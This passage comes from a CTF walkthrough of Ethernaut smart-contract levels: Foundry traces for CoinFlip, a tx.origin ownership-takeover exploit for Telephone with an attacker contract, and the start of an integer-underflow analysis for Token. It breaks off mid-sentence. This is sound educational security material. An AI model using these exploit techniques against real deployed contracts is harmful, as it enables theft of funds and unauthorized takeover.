</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::roll<span style="color:#728e00">(</span>4<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>1168<span style="color:#728e00">]</span> CoinFlip::flip<span style="color:#728e00">(</span><span style="color:#728e00">true</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>733<span style="color:#728e00">]</span> Utils::mineBlocks<span style="color:#728e00">(</span>1<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::roll<span style="color:#728e00">(</span>5<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>1168<span style="color:#728e00">]</span> CoinFlip::flip<span style="color:#728e00">(</span><span style="color:#728e00">true</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>733<span style="color:#728e00">]</span> Utils::mineBlocks<span style="color:#728e00">(</span>1<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::roll<span style="color:#728e00">(</span>6<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>1178<span style="color:#728e00">]</span> CoinFlip::flip<span style="color:#728e00">(</span><span style="color:#728e00">false</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>733<span style="color:#728e00">]</span> Utils::mineBlocks<span style="color:#728e00">(</span>1<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::roll<span style="color:#728e00">(</span>7<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>1168<span style="color:#728e00">]</span> CoinFlip::flip<span style="color:#728e00">(</span><span style="color:#728e00">true</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>733<span style="color:#728e00">]</span> Utils::mineBlocks<span style="color:#728e00">(</span>1<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::roll<span style="color:#728e00">(</span>8<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>1168<span style="color:#728e00">]</span> CoinFlip::flip<span style="color:#728e00">(</span><span style="color:#728e00">true</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>733<span style="color:#728e00">]</span> Utils::mineBlocks<span style="color:#728e00">(</span>1<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::roll<span style="color:#728e00">(</span>9<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>1168<span style="color:#728e00">]</span> CoinFlip::flip<span style="color:#728e00">(</span><span style="color:#728e00">true</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>733<span style="color:#728e00">]</span> Utils::mineBlocks<span style="color:#728e00">(</span>1<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::roll<span style="color:#728e00">(</span>10<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>1178<span style="color:#728e00">]</span> CoinFlip::flip<span style="color:#728e00">(</span><span style="color:#728e00">false</span><span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>733<span style="color:#728e00">]</span> Utils::mineBlocks<span style="color:#728e00">(</span>1<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::roll<span style="color:#728e00">(</span>11<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>4230<span style="color:#728e00">]</span> Ethernaut::submitLevelInstance<span style="color:#728e00">(</span>CoinFlip: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>1183<span style="color:#728e00">]</span> CoinFlipFactory::validateInstance<span style="color:#728e00">(</span>CoinFlip: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>295<span style="color:#728e00">]</span> CoinFlip::consecutiveWins<span style="color:#728e00">()</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← <span style="color:#8a7b52">10</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    │   ├─ emit LevelCompletedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, level: CoinFlipFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    └─ ← <span style="color:#728e00">()</span>
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Key takeaways</p>
<ul>
<li>Blockchains such as <code>Ethereum</code> are deterministic Turing machines.</li>
<li>The <code>block.number</code>, <code>blockhash</code> and <code>block.timestamp</code> are not
reliable sources of randomness.</li>
<li>Good contracts use oracles for random numbers 😇</li>
</ul>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li><a href="https://fravoll.github.io/solidity-patterns/randomness.html"  class="external-link" target="_blank" rel="noopener">Randomness
in Ethereum</a></li>
<li><a href="https://solidity-by-example.org/hacks/randomness/"  class="external-link" target="_blank" rel="noopener">Source of
Randomness</a> from Solidity by Example.</li>
<li><a href="https://blog.positive.com/predicting-random-numbers-in-ethereum-smart-contracts-e5358c6b8620"  class="external-link" target="_blank" rel="noopener">Predicting Random Numbers in Ethereum Smart Contracts</a>.</li>
<li>How to
<a href="https://docs.chain.link/docs/get-a-random-number/"  class="external-link" target="_blank" rel="noopener">Get a
Random Number</a> using Chainlink VRFs.</li>
</ul>
<hr>
<p>You can find the code and solution for this level
<a href="https://github.com/vyorkin/ethernaut-solutions/blob/step-4/src/test/CoinFlip.t.sol"  class="external-link" target="_blank" rel="noopener">here</a>.
Now, let&rsquo;s move on to <a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-5-telephone" >Ethernaut, #5 Telephone</a>!</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Ethernaut, #5 Telephone</p>
<p>We need to claim ownership of the contract below to complete
this level:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Telephone</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">public</span> <span style="color:#434f54">owner</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">changeOwner</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">_owner</span>) <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#728e00">tx</span>.<span style="color:#728e00">origin</span> <span style="color:#728e00">!=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_owner</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>  <!--list-separator-->
<ul>
<li>
<p>Analysis</p>
<p>The <code>changeOwner</code> function requires that <code>tx.origin != msg.sender</code>.</p>
<p>We know that <code>tx.origin</code> always refers to the EOA (externally
owned account) that started the transaction irrespective of the
stack of contracts invoked:</p>
 <div class="mermaid">
<p>%%{init: {&rsquo;theme&rsquo;:&rsquo;neutral&rsquo;}}%%
sequenceDiagram
actor P as Player
participant A as Attacker
participant T as Telephone</p>
<p>P-&raquo;A: new()
activate A
P-&raquo;A: run()
A-&raquo;T: changeOwner(msg.sender)
Note right of A: msg.sender = Player
Note right of A: tx.origin = Player
Note right of T: msg.sender = Attacker
Note right of T: tx.origin = Player
deactivate A</p>
 </div>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Exploit</p>
<p>To exploit this vulnerability, we only need one intermediary
smart contract:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Attacker</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">run</span>(<span style="color:#434f54">Telephone</span> <span style="color:#434f54">level</span>) <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">level</span>.<span style="color:#434f54">changeOwner</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This time we&rsquo;ll use another <code>startPrank</code> function that takes 2
arguments and sets the <code>tx.origin</code> as well:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">startPrank</span>(<span style="color:#00979d">address</span>, <span style="color:#00979d">address</span>) <span style="color:#728e00">external</span>;
</span></span></code></pre></div><p>See the
<a href="https://book.getfoundry.sh/cheatcodes/#cheatcodes-interface"  class="external-link" target="_blank" rel="noopener">Cheatcodes
Reference</a> for details.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">exploit</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">player</span>, <span style="color:#434f54">player</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">new</span> <span style="color:#434f54">Attacker</span>().<span style="color:#434f54">run</span>(<span style="color:#434f54">level</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The trace:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#728e00">test</span> --match-contract TelephoneTest -vvvv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Running <span style="color:#8a7b52">1</span> <span style="color:#728e00">test</span> <span style="color:#728e00">for</span> src/test/Telephone.t.sol:TelephoneTest
</span></span><span style="display:flex;"><span><span style="color:#728e00">[</span>PASS<span style="color:#728e00">]</span> testTelephone<span style="color:#728e00">()</span> <span style="color:#728e00">(</span>gas: 306619<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>Traces:
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">[</span>306619<span style="color:#728e00">]</span> TelephoneTest::testTelephone<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>169662<span style="color:#728e00">]</span> TelephoneTest::create<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::prank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>157314<span style="color:#728e00">]</span> Ethernaut::createLevelInstance<span style="color:#728e00">(</span>TelephoneFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>105751<span style="color:#728e00">]</span> TelephoneFactory::createInstance<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   │   ├─ <span style="color:#728e00">[</span>73234<span style="color:#728e00">]</span> → new Telephone@<span style="color:#7f8c8d">&#34;0x037f…dd8f&#34;</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#8a7b52">255</span> bytes of code
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← Telephone: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ emit LevelInstanceCreatedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, instance: Telephone: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← Telephone: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   └─ ← Telephone: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>303<span style="color:#728e00">]</span> Telephone::owner<span style="color:#728e00">()</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   └─ ← TelephoneFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>50499<span style="color:#728e00">]</span> → new Attacker@<span style="color:#7f8c8d">&#34;0xa2f9…f3a7&#34;</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#8a7b52">252</span> bytes of code
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>1159<span style="color:#728e00">]</span> Attacker::run<span style="color:#728e00">(</span>Telephone: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>544<span style="color:#728e00">]</span> Telephone::changeOwner<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>4346<span style="color:#728e00">]</span> Ethernaut::submitLevelInstance<span style="color:#728e00">(</span>Telephone: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>1299<span style="color:#728e00">]</span> TelephoneFactory::validateInstance<span style="color:#728e00">(</span>Telephone: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>303<span style="color:#728e00">]</span> Telephone::owner<span style="color:#728e00">()</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    │   ├─ emit LevelCompletedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, level: TelephoneFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Test result: ok. <span style="color:#8a7b52">1</span> passed; <span style="color:#8a7b52">0</span> failed; finished in 996.63µs
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Summary</p>
<ul>
<li>Never use <code>tx.origin</code> for authorization.</li>
<li>Use the <code>msg.sender</code> instead if you need to authorize a direct caller.</li>
</ul>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<ul>
<li><a href="https://solidity-by-example.org/hacks/phishing-with-tx-origin/"  class="external-link" target="_blank" rel="noopener">Phishing
with tx.origin</a> from Solidity by Example.</li>
<li><a href="https://docs.soliditylang.org/en/develop/security-considerations.html#tx-origin"  class="external-link" target="_blank" rel="noopener">Security
considerations</a> about <code>tx.origin</code> from Solidity docs.</li>
<li>About <code>tx.origin</code> in
<a href="https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/tx-origin/"  class="external-link" target="_blank" rel="noopener">Ethereum
Smart Contract Best Practices</a> from Consensys.</li>
<li><a href="https://swcregistry.io/docs/SWC-115"  class="external-link" target="_blank" rel="noopener">SWC-115</a> &ndash; Authorization through <code>tx.origin</code>.</li>
</ul>
<hr>
<p>I&rsquo;ll leave the code for this level
<a href="https://github.com/vyorkin/ethernaut-solutions/blob/step-5/src/test/Telephone.t.sol"  class="external-link" target="_blank" rel="noopener">here</a>.</p>
<p>Let&rsquo;s continue to the next challenge &ndash;
<a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-6-token" >Ethernaut, #6 Token</a>!</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Ethernaut, #6 Token</p>
<p>We start with the 20 tokens. To complete this challenge we need
to get some more.</p>
<p>Here is the original <code>Token</code> contract:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">6</span>.<span style="color:#8a7b52">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Token</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">mapping</span>(<span style="color:#00979d">address</span> <span style="color:#728e00">=&gt;</span> <span style="color:#00979d">uint256</span>) <span style="color:#434f54">balances</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">uint256</span> <span style="color:#728e00">public</span> <span style="color:#434f54">totalSupply</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">constructor</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">_initialSupply</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">=</span> <span style="color:#434f54">totalSupply</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_initialSupply</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">transfer</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">_to</span>, <span style="color:#00979d">uint256</span> <span style="color:#434f54">_value</span>) <span style="color:#728e00">public</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">bool</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(<span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">-</span> <span style="color:#434f54">_value</span> <span style="color:#728e00">&gt;=</span> <span style="color:#8a7b52">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">-=</span> <span style="color:#434f54">_value</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">balances</span>[<span style="color:#434f54">_to</span>] <span style="color:#728e00">+=</span> <span style="color:#434f54">_value</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">return</span> <span style="color:#00979d">true</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">balanceOf</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">_owner</span>) <span style="color:#728e00">public</span> <span style="color:#728e00">view</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">uint256</span> <span style="color:#728e00">balance</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">return</span> <span style="color:#434f54">balances</span>[<span style="color:#434f54">_owner</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div>  <!--list-separator-->
<ul>
<li>
<p>Analysis</p>
<p>Let&rsquo;s go line by line and see what we can come up with.</p>
<p>Firstly, let&rsquo;s review the <code>transfer</code> function:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">transfer</span>(<span style="color:#00979d">address</span> <span style="color:#434f54">_to</span>, <span style="color:#00979d">uint256</span> <span style="color:#434f54">_value</span>) <span style="color:#728e00">public</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">bool</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">require</span>(<span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">-</span> <span style="color:#434f54">_value</span> <span style="color:#728e00">&gt;=</span> <span style="color:#8a7b52">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">-=</span> <span style="color:#434f54">_value</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">balances</span>[<span style="color:#434f54">_to</span>] <span style="color:#728e00">+=</span> <span style="color:#434f54">_value</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">return</span> <span style="color:#00979d">true</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>In Solidity <code>&lt;0.8</code> integers overflow/underflow without error and
arithmetic operations always wrap. In Solidity <code>&gt;=0.8</code> the
compiler throws an error on over- and underflow thanks to
<a href="https://docs.soliditylang.org/en/v0.8.13/080-breaking-changes.html#silent-changes-of-the-semantics"  class="external-link" target="_blank" rel="noopener">built
in overflow checking</a>. The <code>Token</code> contract uses Solidity
<code>^0.6.0</code>, which means it is vulnerable to integer
overflows/underflows.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">require</span>(<span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">-</span> <span style="color:#434f54">_value</span> <span style="color:#728e00">&gt;=</span> <span style="color:#8a7b52">0</span>);
</span></span></code></pre></div><p>This check doesn&rsquo;t help given that the contract uses an unsigned
integers for <code>balances</code>.</p>
<p>Let&rsquo;s go over the part that does arithmetics:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">balances</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">-=</span> <span style="color:#434f54">_value</span>;
</span></span><span style="display:flex;"><span><span style="color:#434f54">balances</span>[<span style="color:#434f54">_to</span>] <span style="color:#728e00">+=</span> <span style="color:#434f54">_value</span>;
</span></span></code></pre></div><p>We know that <code>balances[player]</code> equals <code>20</code>. It means to
overflow our balance we need to pass at least <code>21</code>.</p>
<p>We use <code>pragma solidity ^0.8.0</code> everywhere. To obtain the
